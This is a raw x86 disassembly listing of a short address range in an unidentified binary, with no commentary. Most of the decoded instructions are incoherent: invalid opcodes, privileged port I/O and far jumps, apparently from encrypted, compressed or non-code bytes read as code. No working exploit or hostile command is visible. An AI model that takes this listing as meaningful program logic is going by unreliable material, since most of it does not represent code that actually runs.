  4159cf:	mov    ss,WORD PTR [eax-0x51f34e06]
  4159d5:	repnz in al,0x99
  4159d8:	in     eax,dx
  4159d9:	rol    BYTE PTR [ebp-0x44],1
  4159dc:	int3   
  4159dd:	pop    esp
  4159de:	ss push edx
  4159e0:	rcl    BYTE PTR [ecx+0x31efe9e5],0x8b
  4159e7:	push   esp
  4159e8:	mov    ebp,0x325eee62
  4159ed:	mov    edi,eax
  4159ef:	xchg   esi,eax
  4159f0:	pop    ss
  4159f1:	inc    esp
  4159f2:	out    dx,eax
  4159f3:	call   0xa07d9cc3
  4159f8:	inc    edx
  4159f9:	cmp    dl,dh
  4159fb:	loop   0x415a4e
  4159fd:	call   0xac8ec495
  415a02:	psrad  mm7,QWORD PTR [edx+ebx*1]
  415a06:	(bad)  
  415a08:	fwait
  415a09:	in     al,dx
  415a0a:	add    esi,DWORD PTR [eax+0x39]
  415a0d:	call   0x793beb4d
  415a12:	cmp    eax,0xe50635ab
  415a17:	lock push ebx
  415a19:	sub    bl,BYTE PTR [bp+di+0x6a]
  415a1d:	mov    eax,ds:0xf710c1b6
  415a22:	arpl   WORD PTR [edi-0x15],cx
  415a25:	cmp    esp,edi
  415a27:	loope  0x415a26
  415a29:	cmp    DWORD PTR [edi-0x24],edx
  415a2c:	and    eax,DWORD PTR [edx]
  415a2e:	scas   eax,DWORD PTR es:[edi]
  415a2f:	inc    esi
  415a30:	nop
  415a31:	cmp    eax,0x1bd5b857
  415a36:	pop    ss
  415a37:	jmp    0x415a48
  415a39:	pop    esi
  415a3a:	mov    dh,0x32
  415a3c:	mov    eax,ds:0xe6ccd66b
  415a41:	nop
  415a42:	loope  0x415a3f
  415a44:	adc    al,0x5b
  415a46:	or     dl,dh
  415a48:	scas   eax,DWORD PTR es:[edi]
  415a49:	jne    0x415abb
  415a4b:	arpl   WORD PTR [ebp-0x423b38fc],sp
  415a51:	je     0x415a61
  415a53:	mov    dl,BYTE PTR ss:[edi+esi*1]
  415a57:	jne    0x415a2e
  415a59:	shr    ebx,0x5a
  415a5c:	sbb    bh,cl
  415a5e:	retf   0x1ee3
  415a61:	mov    al,0xd1
  415a63:	ret    0x1fa0
  415a66:	mov    bl,0x5c
  415a68:	dec    ebp
  415a69:	popf   
  415a6a:	sbb    eax,0xefdd75a3
  415a6f:	lds    ebp,FWORD PTR ds:0xc233491f
  415a75:	(bad)  
  415a76:	repnz nop
  415a78:	jb     0x415a7b
  415a7a:	and    BYTE PTR [eax-0x1c3f33ff],al
  415a80:	ins    BYTE PTR es:[edi],dx
  415a81:	add    ecx,esi
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	lock mov DWORD PTR [ecx+0x7d574e03],edi
  415ab6:	jp     0x415ac2
  415ab8:	pop    edi
  415ab9:	jp     0x415b35
  415abb:	or     BYTE PTR [esi+0x7c],ch
  415abe:	aaa    
  415abf:	pop    edi
  415ac0:	fcom   DWORD PTR [ebx]
  415ac2:	cmp    bh,dh
  415ac4:	hlt    
  415ac5:	mov    WORD PTR [esi+0x7f],?
  415ac8:	cli    
  415ac9:	je     0x415a8b
  415acb:	and    DWORD PTR [ecx-0x2ae26735],ecx
  415ad1:	out    dx,al
  415ad2:	js     0x415a6c
  415ad4:	lahf   
  415ad5:	leave  
  415ad6:	fnstcw WORD PTR [ebp+eax*4+0x611d8c00]
  415add:	mov    esi,0x82c44e2c
  415ae2:	cmp    eax,0x55266618
  415ae7:	mov    bh,0x42
  415ae9:	enter  0x2111,0x82
  415aed:	and    al,0xa3
  415aef:	xchg   esp,eax
  415af0:	(bad)  es:[ebp-0x1d]
  415af4:	xor    BYTE PTR [ecx+edx*8-0x7fe80f2d],al
  415afb:	or     DWORD PTR [ebp-0x36],edi
  415afe:	(bad)  
  415b00:	jb     0x415a9b
  415b02:	push   ecx
  415b03:	clc    
  415b04:	sbb    ebp,eax
  415b06:	repnz inc ecx
  415b08:	hlt    
  415b09:	and    eax,0x31f8e755
  415b0e:	adc    eax,DWORD PTR [ebx+0x3e402197]
  415b14:	or     al,BYTE PTR [edx-0x585857b1]
  415b1a:	adc    al,0xbb
  415b1c:	cs mov esp,0x933d1684
  415b22:	in     eax,dx
  415b23:	pop    ebp
  415b24:	push   0x4aeceee2
  415b29:	sub    DWORD PTR es:[edi-0x3a],ebx
  415b2d:	mov    esi,0x966921f6
  415b32:	cmp    ebx,DWORD PTR [ebx+0x63]
  415b35:	sahf   
  415b36:	push   ecx
  415b37:	and    BYTE PTR [eax+ebx*4-0x7fcd60bc],ch
  415b3e:	popf   
  415b3f:	or     al,0xa2
  415b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b42:	(bad)  
  415b43:	push   0x2b
  415b45:	inc    eax
  415b46:	leave  
  415b47:	and    bh,BYTE PTR [edi+ebp*2]
  415b4a:	jae    0x415b0f
  415b4c:	nop
  415b4d:	das    
  415b4e:	push   eax
  415b4f:	inc    esp
  415b50:	inc    esi
  415b51:	popf   
  415b52:	sub    DWORD PTR [ebp-0x5381045b],0x39
  415b59:	sbb    DWORD PTR [ebx-0xed5801],edx
  415b5f:	push   ss
  415b60:	aaa    
  415b61:	out    dx,eax
  415b62:	add    BYTE PTR [ebp-0xb],cl
  415b65:	jbe    0x415bb8
  415b67:	adc    al,0xab
  415b69:	inc    edx
  415b6a:	mov    bl,0xa9
  415b6c:	js     0x415b96
  415b6e:	or     eax,0x34103cda
  415b73:	add    eax,0xe29cc572
  415b78:	pop    edi
  415b79:	pop    DWORD PTR [esi+ebx*1]
  415b7c:	inc    eax
  415b7d:	icebp  
  415b7e:	mov    ecx,0x4cb61183
  415b83:	pop    edi
  415b84:	bnd jnp 0x415bd5
  415b87:	sar    BYTE PTR [ebx-0x4ea73210],cl
  415b8d:	jge    0x415bcc
  415b8f:	test   DWORD PTR [ebp+0x24216038],ecx
  415b95:	push   0x7c55db6a
  415b9a:	mov    ecx,0x845710d
  415b9f:	mov    ebp,0xdb1be8c9
  415ba4:	scas   eax,DWORD PTR es:[edi]
  415ba5:	mov    al,ds:0xb2e5684e
  415baa:	jb     0x415c05
  415bac:	xchg   ebx,eax
  415bad:	les    esi,FWORD PTR [esp+eiz*4]
  415bb0:	add    DWORD PTR [edi],edi
  415bb2:	mov    eax,ds:0x1594654e
  415bb7:	cmp    DWORD PTR [edi+0x7bd79bae],eax
  415bbd:	call   0x698e:0x2f94f87
  415bc4:	push   0xd583bcf3
  415bc9:	les    esp,FWORD PTR [edx+edi*4+0x6c949536]
  415bd0:	dec    ecx
  415bd1:	add    esp,DWORD PTR [esi+0x61]
  415bd4:	mov    eax,cs
  415bd6:	sar    BYTE PTR [esi],1
  415bd8:	jb     0x415bbd
  415bda:	scas   al,BYTE PTR es:[edi]
  415bdb:	sbb    eax,0xadb9f685
  415be0:	xchg   edx,eax
  415be1:	add    BYTE PTR [esi],cl
  415be3:	call   0xb0264231
  415be8:	push   esp
  415be9:	or     DWORD PTR [eax],ebp
  415beb:	pop    ss
  415bec:	add    al,0x64
  415bee:	popf   
  415bef:	mov    ecx,0xf27a7e98
  415bf4:	les    eax,FWORD PTR [ecx]
  415bf6:	jle    0x415c47
  415bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bf9:	stos   DWORD PTR es:[edi],eax
  415bfa:	ins    DWORD PTR es:[edi],dx
  415bfb:	fsub   QWORD PTR [eax]
  415bfd:	adc    dh,BYTE PTR [esi-0x48da9634]
  415c03:	jecxz  0x415c82
  415c05:	sub    cl,ch
  415c07:	inc    ecx
  415c08:	dec    edi
  415c09:	push   ecx
  415c0a:	sti    
  415c0b:	fdiv   DWORD PTR [edx+0x20feb7b9]
  415c11:	mov    ds:0x5c071158,al
  415c16:	std    
  415c17:	mov    esp,DWORD PTR [ecx+0x44a194fb]
  415c1d:	retf   
  415c1e:	push   esp
  415c1f:	xchg   ecx,eax
  415c20:	cli    
  415c21:	(bad)  
  415c22:	ins    DWORD PTR es:[edi],dx
  415c23:	inc    edi
  415c24:	and    ebx,DWORD PTR [edx]
  415c26:	push   0xffffffc4
  415c28:	fiadd  WORD PTR [esi]
  415c2a:	mov    dl,dh
  415c2c:	in     eax,dx
  415c2d:	mov    edx,0xf7017932
  415c32:	retf   
  415c33:	xlat   BYTE PTR ds:[ebx]
  415c34:	cmp    DWORD PTR [ebp-0x4b311b7a],ebx
  415c3a:	adc    ebp,ecx
  415c3c:	je     0x415c98
  415c3e:	adc    al,0xb6
  415c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c41:	jae    0x415cae
  415c43:	pop    esp
  415c44:	mov    al,0x3e
  415c46:	push   0xffffffdd
  415c48:	pop    edi
  415c49:	lds    ecx,FWORD PTR [eax+ebx*4+0x49]
  415c4d:	mov    ds:0x97a26e13,al
  415c52:	stos   DWORD PTR es:[edi],eax
  415c53:	cmp    bl,BYTE PTR [esi+0x34]
  415c56:	bnd jno 0x415c4e
  415c59:	xor    BYTE PTR [esi],cl
  415c5b:	lods   al,BYTE PTR ds:[esi]
  415c5c:	or     eax,DWORD PTR [esi+0x4ae72028]
  415c62:	mov    esp,0xf9c2273d
  415c67:	les    edi,FWORD PTR [ebp-0x7a]
  415c6a:	mov    bl,0x57
  415c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c6d:	ss xchg esp,eax
  415c6f:	lock pop esp
  415c71:	sbb    BYTE PTR [ebp-0x49],0x47
  415c75:	push   esp
  415c76:	ret    0x75a
  415c79:	sub    DWORD PTR [eax],ebp
  415c7b:	jno    0x415c16
  415c7d:	adc    BYTE PTR [ebx],dl
  415c7f:	inc    edx
  415c80:	repz sbb ebx,edx
  415c83:	out    dx,al
  415c84:	sbb    al,0x81
  415c86:	push   ds
  415c87:	inc    eax
  415c88:	sbb    ch,BYTE PTR [eax-0x2e7183c7]
  415c8e:	cmp    DWORD PTR [ebx+0x37],ebp
  415c91:	jmp    0x6301:0x393d7677
  415c98:	xchg   edx,eax
  415c99:	cs js  0x415c50
  415c9c:	dec    edi
  415c9d:	call   0x87b03531
  415ca2:	or     eax,0xd6ccb08c
  415ca7:	es leave 
  415ca9:	xchg   edi,eax
  415caa:	mov    esp,0x4d68c579
  415caf:	sar    DWORD PTR [ecx+0x58942722],0x8a
  415cb6:	loopne 0x415c5e
  415cb8:	push   0xffffffa7
  415cba:	jmp    0x6b9e:0x2505110
  415cc1:	mov    eax,ds:0x33bb25b9
  415cc6:	outs   dx,BYTE PTR ds:[esi]
  415cc7:	ss dec edx
  415cc9:	imul   DWORD PTR [edx-0x33]
  415ccc:	sar    bl,1
  415cce:	(bad)  
  415ccf:	adc    eax,DWORD PTR [ecx]
  415cd1:	dec    ebx
  415cd2:	psrlq  mm4,QWORD PTR [ebx-0x2f]
  415cd6:	mov    al,ds:0x48d349da
  415cdb:	sbb    al,0x6
  415cdd:	pop    ecx
  415cde:	in     al,dx
  415cdf:	cmc    
  415ce0:	call   0x7237:0xf22a599d
  415ce7:	js     0x415d64
  415ce9:	sub    DWORD PTR [esi+0x2b],ebx
  415cec:	xor    dl,BYTE PTR [eax]
  415cee:	pop    ebp
  415cef:	data16 cmp BYTE PTR [ebp-0x7fea0bbf],0x64
  415cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cf8:	xchg   esp,eax
  415cf9:	icebp  
  415cfa:	inc    ebp
  415cfb:	sub    BYTE PTR [edx-0x46451a75],bh
  415d01:	or     eax,0x4282916f
  415d06:	pop    ebx
  415d07:	fwait
  415d08:	in     eax,0x1e
  415d0a:	mov    BYTE PTR [eax],bh
  415d0c:	pop    edx
  415d0d:	xor    al,0x53
  415d0f:	clc    
  415d10:	push   edx
  415d11:	add    eax,0x80fe5ea9
  415d16:	(bad)
  415d1a:	or     eax,0x4eba4a68
  415d1f:	or     DWORD PTR [ebx+esi*2],edi
  415d22:	pop    es
  415d23:	fs adc eax,0x85f0e55e
  415d29:	mov    esi,0xdb4b9667
  415d2e:	sbb    al,0x3b
  415d30:	adc    cl,BYTE PTR [eax+0x79]
  415d33:	push   esp
  415d34:	daa    
  415d35:	outs   dx,BYTE PTR ds:[esi]
  415d37:	mov    dl,0x50
  415d39:	mov    ebp,0xd73066d0
  415d3e:	xor    ebx,DWORD PTR [eax-0x3ef73766]
  415d44:	cdq    
  415d45:	(bad)  
  415d47:	xor    al,0x97
  415d49:	jmp    0xfce811d9
  415d4e:	dec    edi
  415d4f:	inc    esp
  415d50:	inc    ecx
  415d51:	sar    BYTE PTR [esi-0x2d],cl
  415d54:	lods   eax,DWORD PTR ds:[esi]
  415d55:	adc    DWORD PTR [ebx+0x771fb2c6],ecx
  415d5b:	popf   
  415d5c:	xchg   ebp,eax
  415d5d:	das    
  415d5e:	mov    ecx,ebp
  415d60:	ret    0x8f42
  415d63:	das    
  415d64:	adc    al,0xc9
  415d66:	and    ch,BYTE PTR [edx]
  415d68:	add    dh,BYTE PTR [edi+0x3]
  415d6b:	xchg   ecx,eax
  415d6c:	xor    edi,edx
  415d6e:	ror    DWORD PTR [esi-0x4d],0x2e
  415d72:	not    BYTE PTR [edi]
  415d74:	call   0xfdb0:0x247a
  415d7a:	jae    0x415d58
  415d7c:	(bad)
  415d80:	mov    BYTE PTR [esi-0x71],cl
  415d83:	arpl   WORD PTR [ebx-0x32f2ae52],cx
  415d89:	and    ebp,ebp
  415d8b:	int    0xea
  415d8d:	adc    esi,DWORD PTR [ecx]
  415d8f:	rol    DWORD PTR [esi+edx*2-0x110021b7],0x6e
  415d97:	lock push esi
  415d99:	mov    dh,ch
  415d9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d9c:	daa    
  415d9d:	cli    
  415d9e:	cmp    ebx,DWORD PTR [edx+0x3d]
  415da1:	es add ebp,ebp
  415da4:	cwde   
  415da5:	outs   dx,DWORD PTR ds:[esi]
  415da6:	jl     0x415da0
  415da8:	js     0x415d5d
  415daa:	call   0x8e1e3f12
  415daf:	adc    eax,esi
  415db1:	shr    BYTE PTR [ebp-0x51b52330],0x30
  415db8:	fs or  al,0xad
  415dbb:	or     eax,0x61e00de4
  415dc0:	call   0x7fa427eb
  415dc5:	cmp    eax,ecx
  415dc7:	or     al,0xe4
  415dc9:	push   cs
  415dca:	je     0x415e3b
  415dcc:	scas   eax,DWORD PTR es:[edi]
  415dcd:	sub    bh,dl
  415dcf:	jae    0x415df8
  415dd1:	xor    ebp,DWORD PTR [edi+0x6e73885a]
  415dd7:	icebp  
  415dd8:	add    edi,0x79e31bac
  415dde:	pop    es
  415ddf:	arpl   WORD PTR [ecx+0x6dd9547],si
  415de5:	je     0x415e4a
  415de7:	rcr    DWORD PTR [ebp+0x67],1
  415dea:	push   ebx
  415deb:	cli    
  415dec:	xlat   BYTE PTR ds:[ebx]
  415ded:	(bad)  
  415dee:	pop    ebp
  415def:	jns    0x415e6f
  415df1:	add    DWORD PTR [edx+ecx*1-0x6b],0xcb73f4b0
  415df9:	sub    al,0xc7
  415dfb:	test   eax,0xe5f5e4f2
  415e00:	mov    ebx,ebx
  415e02:	xor    dh,BYTE PTR [edx+ecx*2]
  415e05:	push   0xac187762
  415e0a:	inc    esp
  415e0b:	mov    bl,0x74
  415e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e0e:	adc    ah,BYTE PTR [eax+ebp*8-0x2]
  415e12:	mov    al,ds:0x2e6ab9c2
  415e17:	out    dx,eax
  415e18:	push   esp
  415e19:	icebp  
  415e1a:	push   eax
  415e1b:	fstp   QWORD PTR [eax+eiz*2+0xef53ee7]
  415e22:	xor    DWORD PTR [edi],edi
  415e24:	add    BYTE PTR [eax],ah
  415e26:	fisub  WORD PTR [ecx-0x7e]
  415e29:	mov    eax,0x99f279b2
  415e2e:	or     edi,ebp
  415e30:	jae    0x415e46
  415e32:	ins    DWORD PTR es:[edi],dx
  415e33:	leave  
  415e34:	adc    DWORD PTR [eax-0x4b89f16a],eax
  415e3a:	jl     0x415dbe
  415e3c:	jne    0x415ea7
  415e3e:	test   BYTE PTR [eax-0x567b9da5],dl
  415e44:	cmp    BYTE PTR [ecx+0x3ecd9fa7],dl
  415e4a:	inc    esp
  415e4b:	inc    ecx
  415e4c:	pop    edx
  415e4d:	add    eax,0x5f466fc8
  415e52:	jecxz  0x415ea1
  415e54:	outs   dx,BYTE PTR gs:[esi]
  415e56:	es jmp 0x1a6eef13
  415e5c:	mov    esp,0xd996bfe2
  415e61:	lea    ebx,[ebx]
  415e63:	lods   al,BYTE PTR gs:[esi]
  415e65:	scas   al,BYTE PTR es:[edi]
  415e66:	aas    
  415e67:	enter  0x6ebe,0x63
  415e6b:	ins    BYTE PTR es:[edi],dx
  415e6c:	(bad)
  415e6f:	icebp  
  415e70:	or     edx,DWORD PTR [edx-0x3ff6782d]
  415e76:	lods   eax,DWORD PTR ds:[esi]
  415e77:	jg     0x415e36
  415e79:	cwde   
  415e7a:	mov    al,0x6f
  415e7c:	adc    bl,BYTE PTR [ebx+edx*8-0x9]
  415e80:	add    cl,dl
  415e82:	les    ebx,FWORD PTR [ebx-0x725edc90]
  415e88:	rcl    DWORD PTR [eax-0x14],cl
  415e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e8c:	mov    gs,esi
  415e8e:	(bad)  
  415e8f:	loop   0x415ef4
  415e91:	stos   DWORD PTR es:[edi],eax
  415e92:	xchg   edi,eax
  415e93:	cli    
  415e94:	add    al,dl
  415e96:	pop    esp
  415e97:	xchg   esi,eax
  415e98:	inc    edx
  415e99:	loope  0x415e26
  415e9b:	xor    dl,BYTE PTR [ecx]
  415e9d:	xchg   DWORD PTR [ecx],ebx
  415e9f:	retf   
  415ea0:	mov    WORD PTR [ecx+0x72],ss
  415ea3:	hlt    
  415ea4:	mov    ch,0x6d
  415ea6:	lock mov DWORD PTR [eax],ebx
  415ea9:	xchg   ebx,eax
  415eaa:	sar    BYTE PTR [ebp+0x2f68cb56],cl
  415eb0:	fcmovbe st,st(1)
  415eb2:	dec    ebp
  415eb3:	sbb    al,BYTE PTR [esi+0x6563f81f]
  415eb9:	jmp    0xb4c6:0x7d59a245
  415ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ec1:	xor    BYTE PTR [esi+0x14885566],bl
  415ec7:	mov    esi,0xc683223c
  415ecc:	jns    0x415ea2
  415ece:	cwde   
  415ecf:	mov    eax,0x63ee7dbc
  415ed4:	call   0x8ba2e168
  415ed9:	and    edx,DWORD PTR [edx-0x22f4997c]
  415edf:	dec    ah
  415ee1:	inc    esp
  415ee2:	and    al,0x45
  415ee4:	lea    edi,[ebp+0x5d2d013]
  415eea:	or     al,0x14
  415eec:	inc    edx
  415eed:	xchg   ebp,eax
  415eee:	jl     0x415e71
  415ef0:	imul   eax,eax,0xa29226a
  415ef6:	rcr    DWORD PTR [eax+0x6],cl
  415ef9:	(bad)  
  415efa:	push   eax
  415efb:	sbb    BYTE PTR [eax-0x23],0x3f
  415eff:	gs jbe 0x415f51
  415f02:	mov    dh,0x78
  415f04:	iret   
  415f05:	jmp    0xdff51f27
  415f0a:	cmc    
  415f0b:	fs aad 0x7b
  415f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f0f:	stos   DWORD PTR es:[edi],eax
  415f10:	out    dx,al
  415f11:	cdq    
  415f12:	mov    dh,0x4d
  415f14:	pop    es
  415f15:	xor    eax,0xfe8a649
  415f1a:	adc    eax,0xa6d1e54f
  415f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f20:	sbb    ebp,DWORD PTR [ecx*2-0x7ba28d53]
  415f27:	xor    BYTE PTR [edi],ch
  415f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f2a:	cmp    eax,DWORD PTR [edx]
  415f2c:	clc    
  415f2d:	pop    ecx
  415f2e:	inc    ecx
  415f2f:	arpl   WORD PTR [eax-0x122a7b4a],cx
  415f35:	scas   eax,DWORD PTR es:[edi]
  415f36:	adc    al,0x9c
  415f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f39:	jo     0x415f16
  415f3b:	addr16 mov ebx,0xb6619556
  415f41:	sbb    DWORD PTR [ebp-0xa],ebx
  415f44:	fnstcw WORD PTR [ecx-0x44]
  415f47:	ficomp DWORD PTR [edx]
  415f49:	(bad)  
  415f4a:	fistp  DWORD PTR [edx-0x46157eae]
  415f50:	arpl   WORD PTR ds:[edi+0x24f5e8ef],bx
  415f57:	pop    ebx
  415f58:	mov    bl,0xab
  415f5a:	xor    DWORD PTR [ebx+0x34227fee],ebp
  415f60:	xor    DWORD PTR [esi+0x71d0d9c0],edi
  415f66:	dec    esp
  415f67:	adc    eax,0x2156b0da
  415f6c:	xor    BYTE PTR [ebx+ebp*2],0xa8
  415f70:	dec    eax
  415f71:	cmp    eax,edx
  415f73:	hlt    
  415f74:	xor    ecx,ebp
  415f76:	jo     0x415fcd
  415f78:	sbb    eax,0x710d79aa
  415f7d:	std    
  415f7e:	mov    ecx,0x6014cd42
  415f83:	loope  0x415f93
  415f85:	lock jge 0x415fa7
  415f88:	cmc    
  415f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f8a:	lea    ecx,[ecx+0x7f]
  415f8d:	sbb    BYTE PTR [esi-0x61608623],bl
  415f93:	mov    esp,0xd79d9516
  415f98:	mov    bl,0x1a
  415f9a:	in     eax,dx
  415f9b:	mov    cl,0x35
  415f9d:	sbb    DWORD PTR [ecx+0x4d],esp
  415fa0:	and    DWORD PTR [eax],edx
  415fa2:	xchg   BYTE PTR [eax-0x2468f1ca],dl
  415fa8:	rcr    DWORD PTR [ebp-0x4db9ed60],1
  415fae:	stos   BYTE PTR es:[edi],al
  415faf:	lahf   
  415fb0:	test   al,0xb
  415fb2:	mov    dl,0xb2
  415fb4:	or     BYTE PTR [ecx-0x4f],0xf
  415fb8:	and    BYTE PTR [edx-0xd],0x39
  415fbc:	cdq    
  415fbd:	rol    BYTE PTR [edi],cl
  415fbf:	mov    edx,DWORD PTR [eax-0x2f]
  415fc2:	and    BYTE PTR [esi],dh
  415fc4:	mov    ebx,0x43a6d65c
  415fc9:	push   edi
  415fca:	loop   0x415fc2
  415fcc:	pop    ds
  415fcd:	rcl    DWORD PTR [edx+esi*4-0xb7bda33],cl
  415fd4:	jg     0x415f89
  415fd6:	rcl    dl,cl
  415fd8:	fs adc al,bh
  415fdb:	mov    ebp,0x912ce9a
  415fe0:	add    BYTE PTR [ecx-0x4090ca28],cl
  415fe6:	inc    edx
  415fe7:	mov    gs,WORD PTR [edx]
  415fe9:	das    
  415fea:	push   ds
  415feb:	or     ecx,DWORD PTR [ecx]
  415fed:	ss mov al,0x4f
  415ff0:	push   0xffffff9e
  415ff2:	lea    edi,[ebp+0x5a]
  415ff5:	lahf   
  415ff6:	aad    0xf3
  415ff8:	push   es
  415ff9:	mov    ebx,0x7a5d9a32
  415ffe:	sti    
  415fff:	cmc    
  416000:	add    eax,0xa1dac7ff
  416005:	out    0x5f,eax
  416007:	pop    eax
  416008:	mov    ebp,0xf3674f38
  41600d:	shl    BYTE PTR [edx-0x6a],cl
  416010:	add    dh,BYTE PTR [ebp-0x17]
  416013:	pop    esp
  416014:	xchg   edi,eax
  416015:	jle    0x415fa0
  416017:	jp     0x415fe8
  416019:	sub    DWORD PTR [eax+0x65d703f9],esp
  41601f:	mov    ebp,edx
  416021:	imul   eax,DWORD PTR [edx],0x4f
  416024:	jo     0x415fcc
  416026:	bound  ebp,QWORD PTR [esi-0x46]
  416029:	sbb    al,0xeb
  41602c:	(bad)  
  41602d:	push   ss
  41602e:	mov    bl,0x99
  416030:	and    al,ch
  416032:	lds    eax,FWORD PTR [edx+eax*2]
  416035:	inc    ebp
  416036:	dec    ebx
  416037:	fcom   st(1)
  416039:	inc    ebx
  41603a:	xchg   ebp,eax
  41603b:	rcr    edi,1
  41603d:	cmp    al,0xb1
  41603f:	mov    BYTE PTR [ebx-0x71],0x6e
  416043:	xor    DWORD PTR [edx],ecx
  416045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416046:	push   ebp
  416047:	cmp    DWORD PTR [esi-0x1c21aa1a],eax
  41604d:	adc    edx,DWORD PTR [eax]
  41604f:	mov    BYTE PTR [eax-0x4a],ah
  416052:	jp     0x416054
  416054:	addr16 dec esi
  416056:	scas   eax,DWORD PTR es:[edi]
  416057:	mov    eax,0xedbb352c
  41605c:	adc    eax,0xb725c529
  416061:	dec    edx
  416062:	cwde   
  416063:	and    al,0x8f
  416065:	lock ret 
  416067:	push   edx
  416068:	inc    ecx
  416069:	out    0xbe,eax
  41606b:	mov    bl,0x9
  41606d:	stc    
  41606e:	retf   
  41606f:	inc    edi
  416070:	in     al,dx
  416071:	fist   WORD PTR [esp+edi*1-0x17e53395]
  416078:	inc    eax
  416079:	or     BYTE PTR [edx+0x7b],ch
  41607c:	sbb    DWORD PTR [ecx+ecx*1],ebx
  41607f:	push   esp
  416080:	and    esi,DWORD PTR [edx+0x78]
  416083:	clc    
  416084:	mov    ebx,0x4b8b68bc
  416089:	bnd jo 0x41606e
  41608c:	cmc    
  41608d:	adc    al,0xe8
  41608f:	xchg   ebx,eax
  416090:	loopne 0x416022
  416092:	pop    ebp
  416093:	popf   
  416094:	pushf  
  416095:	scas   al,BYTE PTR es:[edi]
  416096:	lods   eax,DWORD PTR ds:[esi]
  416097:	fnstsw WORD PTR [ebx]
  416099:	sub    eax,0x73a8724b
  41609e:	push   ebp
  41609f:	push   ecx
  4160a0:	xlat   BYTE PTR ds:[ebx]
  4160a1:	mov    WORD PTR [ebp-0xc],es
  4160a4:	dec    esp
  4160a5:	push   ds
  4160a6:	inc    esp
  4160a7:	pop    es
  4160a8:	stos   DWORD PTR es:[edi],eax
  4160a9:	xor    edi,DWORD PTR [esi]
  4160ab:	loop   0x41606e
  4160ad:	out    0x2a,al
  4160af:	ins    DWORD PTR es:[edi],dx
  4160b0:	fsub   QWORD PTR [edx+edi*4-0xe]
  4160b4:	cmp    al,0x39
  4160b6:	sub    eax,0x3cb20dda
  4160bb:	push   edx
  4160bc:	(bad)  
  4160bd:	call   0x493c3fc
  4160c2:	dec    esp
  4160c3:	xor    ebx,DWORD PTR [ebp+0x2e]
  4160c6:	dec    esp
  4160c7:	mov    bl,0x19
  4160c9:	mov    ah,0xf2
  4160cb:	pop    esi
  4160cc:	inc    ebp
  4160cd:	rcl    DWORD PTR [eax+0x40],cl
  4160d0:	test   al,0xcd
  4160d2:	push   ebx
  4160d4:	rcr    BYTE PTR [ebx+0x58265d90],1
  4160da:	push   edi
  4160db:	jp     0x416094
  4160dd:	dec    ebp
  4160de:	lods   eax,DWORD PTR ds:[esi]
  4160df:	imul   ebx,DWORD PTR [edx-0x73],0x9acbc72a
  4160e6:	mov    ecx,0x80b0fa69
  4160eb:	mov    ebx,0xeb0e81e
  4160f0:	jnp    0x4160c3
  4160f2:	sub    DWORD PTR [ebp+0x3e2fa38b],ebx
  4160f8:	test   eax,0x34f1458
  4160fd:	inc    ebp
  4160fe:	sub    BYTE PTR [ecx],0x7
  416101:	stos   DWORD PTR es:[edi],eax
  416102:	cli    
  416103:	pop    es
  416104:	push   esp
  416105:	push   ss
  416106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416107:	mov    bl,cl
  416109:	jl     0x41612c
  41610b:	ins    DWORD PTR es:[di],dx
  41610d:	daa    
  41610e:	scas   al,BYTE PTR es:[edi]
  41610f:	jnp    0x4160fa
  416111:	es and eax,0x8ff7858
  416117:	jmp    0x416192
  416119:	loopne 0x4160e1
  41611b:	xchg   esi,eax
  41611c:	in     al,0x6e
  41611e:	mov    ds:0xedb58d83,al
  416123:	pop    esi
  416124:	and    DWORD PTR [edx+0x31],edx
  416127:	cmp    eax,edx
  416129:	jmp    0x416187
  41612b:	adc    cl,BYTE PTR [ebx]
  41612d:	dec    ebp
  41612e:	and    bp,WORD PTR ss:[edx+0x30]
  416133:	into   
  416134:	gs popa 
  416136:	mov    bl,0x11
  416138:	out    0x14,eax
  41613a:	imul   edx,DWORD PTR [esi+ecx*1],0xca911092
  416141:	out    dx,eax
  416142:	sub    eax,0x5dfd680c
  416147:	scas   eax,DWORD PTR es:[edi]
  416148:	push   esp
  416149:	js     0x416186
  41614b:	pop    ecx
  41614c:	jg     0x416178
  41614e:	adc    al,0x9e
  416150:	imul   esi,DWORD PTR [esp+ecx*4],0x619472b9
  416157:	and    BYTE PTR [esi+0x1e],ah
  41615a:	xchg   DWORD PTR [ecx+ebp*4],esi
  41615d:	push   0xfb5c82f1
  416162:	cs and esi,edi
  416165:	adc    DWORD PTR [ebp-0x7512429],eax
  41616b:	jb     0x4161e7
  41616d:	mov    ds:0xd692bc9d,eax
  416172:	xchg   esi,eax
  416173:	pop    ebx
  416174:	dec    edx
  416175:	outs   dx,DWORD PTR ds:[esi]
  416176:	bound  edx,QWORD PTR [esi+0x52]
  416179:	fistp  WORD PTR [esi]
  41617b:	test   eax,0xe493b515
  416180:	sti    
  416181:	pop    ebp
  416182:	aaa    
  416183:	loopne 0x41617d
  416185:	mov    al,0xa0
  416187:	xchg   esi,eax
  416188:	jg     0x416155
  41618a:	fdivrp st(5),st
  41618c:	pop    ecx
  41618d:	ror    DWORD PTR [ecx+edi*2+0x8],0x1f
  416192:	dec    ecx
